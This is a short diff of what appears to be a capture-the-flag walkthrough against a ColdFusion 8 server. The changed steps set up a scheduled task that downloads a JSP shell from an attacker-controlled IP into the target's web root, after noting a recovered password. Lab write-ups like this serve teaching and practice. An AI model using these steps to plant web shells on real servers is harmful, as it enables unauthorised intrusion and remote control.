@@ -17,7 +17,7 @@ we got the password "happyday"
 Enter task name
 Enter URL => http://10.10.14.9/shell.jsp
 Enter File => C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
-Mark the check box => Save output to a file
+Mark the check box => Save output to a file and submit. Run the scheduler, so the shell,jsp got downloaded into the target
 
 Save the task
 
